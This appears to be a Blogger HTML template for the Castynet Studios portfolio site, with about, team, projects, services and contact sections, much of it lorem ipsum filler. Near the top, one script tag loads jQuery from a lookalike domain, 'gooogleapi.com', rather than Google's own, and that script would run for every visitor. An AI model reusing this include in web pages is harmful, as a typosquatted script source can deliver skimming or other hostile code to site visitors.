...
<html xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
  <head>
	...
	<script src='https://use.fontawesome.com/b3fdc351c3.js'/>
    <!-- Google Fonts -->
    <link href='http://fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'/>
    <link href='http://fonts.googleapis.com/css?family=Raleway:400,600' rel='stylesheet' type='text/css'/>
    <link href='https://fonts.googleapis.com/css?family=Baloo+Bhai:400' rel='stylesheet' type='text/css'/>
...
#sectionIntro {
	...
	background-color: #f2f2f2;
 	background-image: url(https://1.bp.blogspot.com/-fbxWH9rcgN8/XdKo5mNslhI/AAAAAAAAIM8/6iBeunKkqCAO9Gh5avDQ3D230fhKg6L5QCLcBGAsYHQ/s1600/castynet-cover.png);
...
<script src='https://ajax.gooogleapi.com/ajax/libs/jquery/1.7.14/jquery.min.js'/>
...
<!--<body>-->
<body onload="preLoaderExit()" style="margin:0;">
  <!-- Preloader -->
      <!--
      <div class="frame" id="load-er" style="display:block;">
        <div class="center">
          <div class="dot-1"></div>
          <div class="dot-2"></div>
          <div class="dot-3"></div>
...
<div id="allContent">
		<!-- Top Navigation -->
      <div class='menu-wrap' id='openHideMenu' style='display: none;'>
        <nav class='menu navigation' onclick='closeNavPage()'>
          <ul class='navbar menu-nav'>
            <li><a class='easing' href='#sectionIntro'>Intro</a></li>
            <li><a class='easing' href='#sectionAbout'>About</a></li>
            <li><a class='easing' href='#sectionResume'>The Team</a></li>
      ...
      <button class='menu-button' onclick='closeNavPage()'>
        ...
        <div class='col-md-12 introHeader'>
          <div class='introContent'>
            ...
            <b:section class='header' id='header' maxwidgets='1' showaddelement='yes'>
              <b:widget id='Header1' locked='true' title='Castynet Studios (Header)' type='Header' version='1'>
                <b:widget-settings>
    ...
    <a expr:href='data:blog.homepageUrl'><data:title/></a>
      ...
      <section class='connect'>
        <div class='box connect-box'>
         ...
         <li><a class='twitter' href='#'><span class='fa fa-twitter'/></a><span class='text-twitter'>Twitter</span></li>
         <li><a class='facebook' href='https://www.facebook.com/templateclue' target='_blank'><span class='fa fa-facebook'/></a><span class='text-facebook'>Facebook</span></li>
         <li><a class='gplus' href='#'><span class='fa fa-google'/></a><span class='text-gplus'>Google+</span></li>
         <li><a class='instagram' href='#'><span class='fa fa-instagram'/></a><span class='text-instagram'>Instagram</span></li>
	     <li><a class='youtube' href='#'><span class='fa fa-linkedin'/></a><span class='text-youtube'>LinkedIn</span></li>
            </ul>
			...
			<a class='easing scroll-down' href='#sectionAbout'>
              <div class='icon lnr lnr-arrow-down'/>
            </a>
...
<b:if cond='data:blog.pageType != &quot;static_page&quot;'>
      ...
      <!-- section TITLE -->
        ...
        <h1>About Us</h1>
        <h4>Here is what you should know</h4>
          <hr/>
        </div>
                  ...
                  <h3>A bit about us</h3>
                    <p>
                        <span class='textCasty'>
                          Castynet is a small team of software developers based in Nairobi KE. We are high spirited geeks passionate about tech.
                        </span>
                    </p>
                    <p>
                            Our mission is to create empowering software across the web and android platforms. We are powered by coffee, unreal imagination &amp; attention to detail.<br/>
                            If you have a project that you think would be a great fit for us do <u><a class='easing' href='#sectionContact'>reach out.</a></u>
                    </p>
                    <p>
                        <i>
                            &quot;The most important aspect of any software system is that its usable&quot;
                        </i>
                        <br/>
                        <b>
                            &#8211; someone at Castynet.
			...
			<!-- Porfile Av -->
         <img alt='Studio Logo' class='profileAv centered' src='https://1.bp.blogspot.com/-HZUaAzVL0ZU/XdFAINuOj7I/AAAAAAAAIJ4/eLGY2OQLBX08UIpg53RGMHOCshetBIK-ACLcBGAsYHQ/s1600/Untitled-1.png'/>
			<!-- Porfile Av End-->
                  </div>
                  ...
                  <div class='col-md-4 aboutMe aboutInfo wow fadeInUp animated' style='visibility: visible;'>
                   ...
                   <div class='profileInfo'>
                      <p>
                        - 5 star rating on Google (literally 5/5).
                      </p>
                      <p>
                        - 6800 lines of code.
                      </p>
...
<b:if cond='data:blog.pageType != &quot;static_page&quot;'>
      ...
      <div class='sectionTitle wow fadeInUp animated' style='visibility: visible;'>
            ...
            <h1>A FEW MORE DETAILS</h1>
              ...
              <h4>Meet the Team and our projects</h4>
      ...
      <div class='col-md-6 col-sm-6 col-xs-12 resumeLeft'>
        ...
        <h2>The Team</h2>
          ...
          <span class='lnr lnr-users wow bounceIn animated animated' style='visibility: visible;'/>

           <ul class='resumeList'>

              <li class='wow fadeInLeft animated' style='visibility: visible;'>
                <b class='resumePeriod'>UI/UX Developer</b>          
                  <h4>
                    Riunge Maina
                  </h4>
              ...
              <li class='wow fadeInLeft animated' style='visibility: visible;'>
                <b class='resumePeriod'>Web Developer</b>          
                  <h4>
                    Victor Ambutsi
                  </h4>
                  <p>Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p>
      ...
      <div class='col-md-6 col-sm-6 col-xs-12 resumeRight'>
        ...
        <h2>Projects</h2>
          ...
          <span class='lnr lnr-layers wow bounceIn animated animated' style='visibility: visible;'/>

            <ul class='resumeList'>

              <li class='wow fadeInRight animated' style='visibility: visible;'>
                <b class='resumePeriod'>Blog</b>
                  <h4>
                    NukeSafaris
                  </h4>
                  <p>Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p>
              ...
              <li class='wow fadeInRight animated' style='visibility: visible;'>
                <b class='resumePeriod'>Online Shop</b>
                  <h4>
                    Shop-Beta
                  </h4>
                  <p>Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p>
              ...
              <li class='wow fadeInRight animated' style='visibility: visible;'>
                <b class='resumePeriod'>Community</b>
                  <h4>
                    Comunnity-Beta
                  </h4>
                  <p>Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p>
      ...
      <div class='container-fluid'>
        <div class='resumeStats'>
          ...
          <span class='lnr lnr-thumbs-up wow bounceIn animated' style='visibility: visible;'/>
          <h2>Skills &amp; Things about us</h2>

          <div class='col-md-2 col-xs-6 col-sm-4 wow fadeInLeft animated' style='visibility: visible;'>
          ...
          <div class='col-md-2 col-xs-6 col-sm-4 wow fadeInRight animated' style='visibility: visible;'>
            <div class='statsIconPerc'>
              86%
            </div>
            <div class='statsName'>
          ...
          <div class='col-md-2 col-xs-6 col-sm-4 last-twenty wow fadeInRight animated' style='visibility: visible;'>
            <div class='statsIconPerc'>
              64%
            </div>
            <div class='statsName'>
...
<b:if cond='data:blog.pageType != &quot;static_page&quot;'>
	<div class='sectionTitle wow fadeInLeft animated' style='visibility: visible;'>
        <h1>Portfolio</h1>
        <h4 style='color: #bfbfd1;  !important; letter-spacing: 2px; font-weight: 600;'>Our latest projects</h4>
      <hr/>
        </div>
      </b:if></b:if>
      ...
      gapi.load(&quot;gapi.iframes:gapi.iframes.style.bubble&quot;, function() {
        if (gapi.iframes &amp;&amp; gapi.iframes.getContext) {
          gapi.iframes.getContext().openChild({
              url: &#39;https://draft.blogger.com/navbar.g?targetBlogID\x3d7488100118320911403\x26blogName\x3dCastynet+Studios\x26publishMode\x3dPUBLISH_MODE_BLOGSPOT\x26navbarType\x3dDISABLED\x26layoutType\x3dLAYOUTS\x26searchRoot\x3dhttps://castynet-beta.blogspot.com/search\x26blogLocale\x3den\x26v\x3d2\x26homepageUrl\x3dhttps://castynet-beta.blogspot.com/\x26vt\x3d1578299068653244950&#39;,
...
<section id='sectionServices'>
      ...
      <div class='col-md-4 col-sm-6 col-xs-12 servicesCol4'>
        <div class='servicesLeft'>
          <span class='icon lnr lnr-laptop'/>
        </div>
        <div class='servicesRight'>
        <h3>Web Design</h3>
          <p>
      ...
      <div class='col-md-4 col-sm-6 col-xs-12 servicesCol4'>
        <div class='servicesLeft'>
          <span class='icon lnr lnr-pencil'/>
        </div>
        <div class='servicesRight'>
    ...
    <!--Services second-row-->
     ...
     <div class='col-md-4 col-sm-6 col-xs-12 servicesCol4'>
        <div class='servicesLeft'>
          <span class='icon lnr lnr-camera'/>
        </div>
        <div class='servicesRight'>
        <h3>Photography</h3>
          <p>
          Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod.
          Donec sit amet venenatis ligula. Aenean sed augue scelerisque, dapibus risus sit amet.
          </p>
        </div>
      </div>
...
<b:section class='contact-form' id='contact-form' preferred='yes'>
  <b:widget id='ContactForm1' locked='false' title='Contact Form' type='ContactForm' version='1'>
    <b:includable id='main'>
      <form id='contactForm' name='contact-form'>
		...
		<div class='form-group'>
        <textarea expr:id='data:widget.instanceId + &quot;_contact-form-email-message&quot;' placeholder='Message* :' required='' type='tel'/>
        </div>

        <input class='submit wow bounceIn animated animated' expr:id='data:widget.instanceId + &quot;_contact-form-submit&quot;' expr:value='data:contactFormSendMsg' style='visibility: visible;' type='submit'/>
  ...
  <b:include name='quickedit'/>
      ...
      <div class='icon lnr lnr-envelope'/>
      <h3>Email</h3>
      <p class='space_out'>hello@castnet.co.ke</p>
      </div>

      <div class='contactBox'>
      <div class='icon lnr lnr-tablet'/>
      <h3>Phone number</h3>
      <p class='space_out'>+(254) 743665574</p>
      </div>

      <div class='contactBox'>
      <div class='icon lnr lnr-picture'/>
      <h3>Social</h3>
      <p class='space_out'>@castynet</p>
      </div>
      ...
      <div class='container'>
          ...
          <div class='col-md-6 col-sm-6 col-xs-12 footerLeft'>
            <p class='foot_er'>
              Copyright &#169; 2019 Castynet Studios <br/>- a Software Engine 🎓
            </p>
            <div style='display:none !important;'>
              <p id='templateclue'> no show </p>
            </div>
          </div>
...
function closeNavPage() {
  var x = document.getElementById(&quot;openHideMenu&quot;);
  if (x.style.display === &quot;none&quot;) {
    x.style.display = &quot;block&quot;;
  } else {
    x.style.display = &quot;none&quot;;
  }
  var x = document.getElementById(&quot;blurContentblur&quot;);
  if (x.style.filter === &quot;grayscale(0)&quot;) {
...
function preLoaderExit() {
  preLoader = setTimeout(showPage, 2000);
}

function showPage() {
  document.getElementById("load-er").style.display = "none";
